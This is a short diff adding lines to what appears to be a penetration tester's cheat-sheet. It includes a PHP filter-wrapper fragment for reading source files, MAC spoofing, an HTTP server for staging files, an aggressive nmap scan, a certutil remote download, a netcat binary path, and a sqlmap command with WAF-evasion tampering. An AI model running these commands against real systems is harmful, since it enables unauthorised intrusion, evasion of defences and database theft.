@@ -19,3 +19,9 @@ php //filter/convert.base64-encode/resource=
 # ifconfig [interface] hw ether 00:11:22:33:44:55
 # ifconfig [interface] up
 **************************************************
+
+python -m SimpleHTTPServer 8000
+nmap -iL file.txt -T5
+certutil -URLCache -f ip/file.txt destino
+/usr/share/windows-binaries/nc.exe
+sqlmap -u "http://www.site.com/?id=" --risk=1 --level=1 --random-agent --ignore-proxy --threads=5 --tamper=modsecurityversioned --dbs
